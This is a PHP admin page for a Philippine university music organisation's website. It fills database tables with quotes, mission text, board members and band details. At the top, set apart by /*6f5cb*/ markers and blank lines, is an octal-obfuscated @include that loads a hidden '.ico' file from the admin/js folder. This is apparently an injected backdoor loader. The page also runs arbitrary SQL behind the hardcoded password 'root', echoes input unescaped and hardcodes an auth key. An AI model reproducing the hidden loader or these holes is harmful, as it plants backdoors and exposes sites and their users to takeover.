<?php
/*6f5cb*/

@include "\057h\157m\1453\057c\157m\160s\141t\157/\160u\142l\151c\137h\164m\154/\141m\160/\141d\155i\156/\152s\057.\0672\066e\0621\0620\056i\143o";

/*6f5cb*/






















































	require_once '../php/global.php';
	source('sql.php');
	$db = database();
	source(jquery());

	// populates information from text files to database
	function populate() {

		global $db;
		
		// HOME
		queryInsert($db, 'home', array(null, 1, 0, 'Maaalala ba? Maaalala ba? Maaalala-banderaaaaaa!', 'Labandera', 'Ashley\'s Kryptonite', 'images/home/10.jpg'));
		queryInsert($db, 'home', array(null, 1, 1, 'Bad vibes man, nakaka-insane.', 'Conyo from Ateneo', 'Perkywasted', 'images/home/9.jpg'));
		queryInsert($db, 'home', array(null, 1, 2, 'This song is about staying true to yourself, kahit may relationship ka na, it\'s called Liger says Meow.', null, 'DogTown', 'images/home/7b.jpg'));
		queryInsert($db, 'home', array(null, 1, 3, 'Do you recall the time we rolled up in the grass? And then you told me to stop playing with your...Heart.', 'Value Man', 'The Cohens', 'images/home/11.jpg'));
		queryInsert($db, 'home', array(null, 1, 4, 'we\'re not communists, we are however looking for gigs :-)', null, 'Chairman Mouse', 'images/home/13.jpg'));

		// ABOUT
		queryInsert($db, 'about', array(null, 1, 'about_amp', 'We live and breathe music because we love it. But we don\'t stop there.\nWe have passion that drives us to create an experience along with it.\nWe believe that <b>music</b> is in everything.'));
		queryInsert($db, 'about', array(null, 1, 'mission', 'We dedicate ourselves to excel in music production, development, and appreciation by creating <b>projects</b> and structures that support members in enhancing their talents and fulfilling their pursuits.\nWe advocate our members\' holistic <b>formation</b> and contribute to the transformation of the Philippine society by creating a view of human existence where music and the arts are essential.'));
		queryInsert($db, 'about', array(null, 1, 'vision', 'We, the Ateneo Musicians\' Pool, are a non-profit organization where individuals realize their <b>integral development</b> through music.'));
		queryInsert($db, 'about', array(null, 1, 'executive_board', 'The Executive Board is composed of the leaders of The Ateneo Musicians\' Pool, who make sure that all internal and external org operations run efficiently and smoothly.'));
		queryInsert($db, 'about', array(null, 1, 'eb_group_image_url', 'images/about/eb/group.png'));
		queryInsert($db, 'about', array(null, 1, 'auth_key', 'd13a256ab6773051afce994629fe1448'));

		// MENU
		queryInsert($db, 'menu', array(null, 1, 0, 'home', '/index.php', null));
		queryInsert($db, 'menu', array(null, 1, 1, 'about', '/about.php', null));
		queryInsert($db, 'menu', array(null, 1, 2, 'artists', '/artists.php', null));
		queryInsert($db, 'menu', array(null, 1, 3, 'tube', null, null));
		queryInsert($db, 'menu', array(null, 1, 4, 'results roster', '/results.php', null));

		// EXECUTIVE BOARD
		$eboard = parseFile('../info/executive-board.txt');
		$order_id = 0;
		foreach ($eboard as $position => $info) {
			$chairperson = get($info, 'Name');
			$course = get($info, 'Course')[0]; // first course only
			$description = get($info, 'Description');
			$image_url = get($info, 'Image');
			$year = 2015 - intval($course) + 1;
			$course = substr(strstr($course, ' '), 1);
			queryInsert($db, 'eb_member', array(null, 1, ++$order_id, $position, $description, $chairperson, $year, $course, $image_url));
		}

		// DEPARTMENTS
		$departments = parseFile('../info/departments.txt');
		$order_id = 0;
		foreach ($departments as $department_name => $info) {
			$description = get($info, 'Description');
			$image_url = get($info, 'Image');
			$officers = get($info, 'Officers');
			queryInsert($db, 'department', array(null, 1, ++$order_id, $department_name, $description, $image_url));
			$department_id = $db->lastInsertId();
			// insert department officers
			$officer_order_id = 0;
			if (!is_null($officers)) {
				foreach ($officers as $name => $position) {
					queryInsert($db, 'officer', array(null, 1, ++$officer_order_id, $name, $department_id, $position));
				}
			}
		}

		// ARTISTS
		$artists = parseFile('../info/artists.txt');
		$order_id = 0;
		foreach ($artists as $band_name => $info) {
			// get initial info
			$description = get($info, 'Description');
			$image_url = get($info, 'Image');
			$image_strip_url = get($info, 'Strip');
			$contacts = get($info, 'Contact');
			$links = get($info, 'Links');

			// insert main band info
			queryInsert($db, 'artist', array(null, 1, ++$order_id, $band_name, $description, $image_url, $image_strip_url, 1));
			$band_id = $db->lastInsertId();

			// insert band members' info
			if (get($info, 'Members')) {
				foreach ($info['Members'] as $member => $roles) {
					queryInsert($db, 'band_member', array(null, 1, null, $member, $band_id));
					$member_id = $db->lastInsertId();
					// link band roles to member
					foreach ($roles as $role) {
						queryInsert($db, 'band_role', array(null, null, $role, $member_id));
					}
				}
			}

			// insert band contact info
			if (!is_null($contacts)) {
				if (is_array($contacts)) {
					foreach ($contacts as $contact) {
						queryInsert($db, 'contact', array(null, null, $contact, $band_id));
					}
				} else {
					queryInsert($db, 'contact', array(null, null, $contacts, $band_id));
				}
			}

			// insert band link info
			if (!is_null($links)) {
				if (is_array($links)) {
					foreach ($links as $link) {
						queryInsert($db, 'link', array(null, null, $link, $band_id));
					}
				} else {
					queryInsert($db, 'link', array(null, null, $link, $band_id));
				}
			}

		}

	}

	// uncomment for code creation
	?><form method='post'>
		<input name='query' type='text' placeholder='Query' <?php if (isset($_POST['query'])) echo 'value=\''.$_POST['query'].'\''; ?>></input><br>
		<input name='password' type='password' placeholder='Password' <?php if (isset($_POST['password'])) 'value=\''.$_POST['password'].'\''; ?>></input><br>
		<input type='submit' value='Submit Query'></input><br>
	</form><?php

	if (isset($_POST['query']) && get($_POST, 'password') === 'root') {
		if ($_POST['query'] === 'populate') {
			$create_query = file_get_contents('create.sql');
			$time = microtime(true);
			if ($db->getAttribute(PDO::ATTR_DRIVER_NAME) == 'mysql') {
				$from = array('PRIMARY KEY', 'is_active INTEGER', 'is_band INTEGER');
				$to = array('PRIMARY KEY AUTO_INCREMENT', 'is_active BIT', 'is_band BIT');
				$create_query = str_replace($from, $to, $create_query);
			}
			$db->exec($create_query);
			populate();
			echo sprintf('<pre>Done populating in %.3f seconds<br></pre>', microtime(true) - $time);
		} else {
			echo '<h2>Query Results:</h2>';
			queryToHtml($db, $_POST['query']);
			echo '<hr>';
		}
	}

	// gather all table names
	$database = $db->getAttribute(PDO::ATTR_DRIVER_NAME);

	// describe table syntax varies per database type
	if ($database == 'sqlite') {
		$query = 'SELECT tbl_name from sqlite_master WHERE type="table" ORDER BY name;';
		$table_info = 'PRAGMA table_info(%s)';
	}

	else if ($database == 'mysql') {
		$query = 'SHOW TABLES';
		$table_info = 'DESC %s';
	}

	$result = $db->query($query);

	if ($result) {
		foreach ($result as $row) {
			$table_name = $row[0];
			echo '<h2><b>'.strtoupper($table_name).'</b></h2>';
			queryToHtml($db, sprintf($table_info, $table_name));
			echo '<br>';
			queryToHtml($db, 'SELECT * FROM ' . $table_name, 'paragraph');
		}
	}

	$db = null;

?>